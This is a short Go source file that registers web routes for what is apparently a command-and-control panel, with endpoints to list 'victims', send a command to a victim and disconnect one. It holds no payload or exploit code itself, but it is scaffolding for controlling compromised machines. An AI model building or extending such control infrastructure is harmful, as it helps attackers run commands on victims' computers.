package routes

import (
	"c2-control-panel/api/controllers"

	"github.com/gofiber/fiber/v2"
)

func RegisterVictimRoutes(router fiber.Router, vc *controllers.VictimsController) {
	victims := router.Group("/victims")

	victims.Get("/", vc.GetVictims)
	victims.Get("/:id", vc.GetVictim)
	victims.Post("/:id/command", vc.SendCommand)
	victims.Post("/:id/disconnect", vc.Disconnect)
}
